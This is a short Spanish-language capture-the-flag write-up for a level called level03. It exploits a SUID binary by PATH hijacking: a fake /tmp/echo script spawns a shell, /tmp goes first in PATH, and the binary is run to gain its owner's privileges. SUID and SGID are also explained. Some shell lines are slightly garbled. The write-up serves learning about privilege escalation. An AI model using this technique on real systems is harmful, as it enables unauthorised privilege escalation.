Level03 Explotación de binarios (PATH hijacking)
ls  -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
Analisis : 
file binario : Identifica el tipo real de un archivo.
strings binario : Secuencias de caracteres imprimibles.
strings -n 4 level03 : imprime palabras de al menos 4 caracteres de longitud.

Fallos : 
	/usr/bin/env echo Exploit me
Esta ejecutando echo sin path absoluta lo que hace es buscar en path para encontrarlo y ejecutarlo. Esto permite hardcodear una función echo para que haga lo que nosotros queremos.
Procedure : 
nano /tmp/echo #!/bin/sh/  /bin/bash/ O 
	cat > echo << ‘EOF’
	> #!/bin/sh
> /bin/bash o /bin/sh
EOF
chmod +x echo
export PATH=/tmp:$PATH
./binario
Proporciona el usuario con privilegios SUID; SGID
SUID (set user id) Es un permiso especial que permite al usuario ejecutar un programa con los privilegios del propietario del archivo. Permite a usuarios comunes realizar tareas que requieren permisos elevados.
SGID (set group id) 
id  O whoami 
getflag

